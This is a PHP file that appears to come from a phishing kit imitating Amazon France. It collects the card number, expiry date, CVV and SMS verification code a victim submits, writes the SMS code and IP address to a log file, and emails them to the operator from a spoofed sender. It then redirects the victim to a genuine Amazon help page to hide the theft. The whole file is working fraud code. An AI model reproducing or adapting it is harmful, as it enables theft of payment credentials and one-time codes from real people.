<?php
include_once 'info.php';
include 'creditcards.class.php';
include 'em.php';
include 'check.php';
$sms = $_POST['sms'];
$ccnum = $_POST['addCreditCardNumber'];
$ccmo = $_POST['ppw-expirationDate_month'];
$ccyo = $_POST['ppw-expirationDate_year'];
$cvv = $_POST['addCreditCardVerificationNumber'];
$message = "++++++++++++#Amazon[Fr]#++++++++++++\n";
$message .= "SMS: $sms\n";
$message .= "IP: $ip\n";
$fp = fopen("../../sms.txt", 'ab'); fwrite($fp, $message); fclose($fp);
$subject = "SMS 2 : ". $sms ." - ". $ip;
strip(strip_tags($message));
mail($to, $subject, $message, 'From: noreply@aloha.fr');

@header("location: https://www.amazon.fr/gp/help/customer/display.html/ref=hp_left_v4_sib?&nodeId=201994040"); // OkBye! 

?>